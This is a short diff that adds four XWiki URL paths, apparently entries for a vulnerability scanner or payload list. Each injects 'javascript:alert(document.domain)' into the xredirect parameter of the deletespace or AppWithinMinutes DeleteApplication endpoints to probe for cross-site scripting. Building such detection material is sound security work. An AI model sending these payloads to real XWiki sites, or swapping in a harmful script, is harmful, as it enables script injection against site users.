@@ -1,0 +1,4 @@
+/xwiki/bin/deletespace/Sandbox/?xredirect=javascript:alert(document.domain)
+/bin/deletespace/Sandbox/?xredirect=javascript:alert(document.domain)
+/xwiki/bin/view/AppWithinMinutes/DeleteApplication?appName=Menu&resolve=true&xredirect=javascript:alert(document.domain)
+/bin/view/AppWithinMinutes/DeleteApplication?appName=Menu&resolve=true&xredirect=javascript:alert(document.domain)
